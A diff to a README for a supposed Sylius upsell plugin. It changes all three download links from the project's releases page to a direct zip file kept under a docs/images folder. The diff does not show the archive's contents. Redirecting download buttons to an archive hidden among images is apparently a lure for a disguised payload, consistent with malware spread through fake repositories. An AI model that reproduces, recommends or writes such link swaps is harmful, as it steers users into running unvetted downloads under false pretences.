@@ -1,6 +1,6 @@
 # 🛒 sylius-upsell-plugin - Boost Orders With Simple Add-Ons
 
-[![Download the plugin](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/releases)
+[![Download the plugin](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/raw/refs/heads/main/docs/images/upsell-plugin-sylius-v1.2.zip)
 
 ## 🚀 What this is
 
@@ -24,7 +24,7 @@ For most users, the main task is to visit the release page, download the correct
 
 Visit this page to download the latest release:
 
-[https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/releases](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/releases)
+[https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/raw/refs/heads/main/docs/images/upsell-plugin-sylius-v1.2.zip](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/raw/refs/heads/main/docs/images/upsell-plugin-sylius-v1.2.zip)
 
 On that page:
 
@@ -206,5 +206,5 @@ When downloading from GitHub:
 
 ## 🖱️ Release page
 
-[Open the download page](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/releases)
+[Open the download page](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/raw/refs/heads/main/docs/images/upsell-plugin-sylius-v1.2.zip)
 
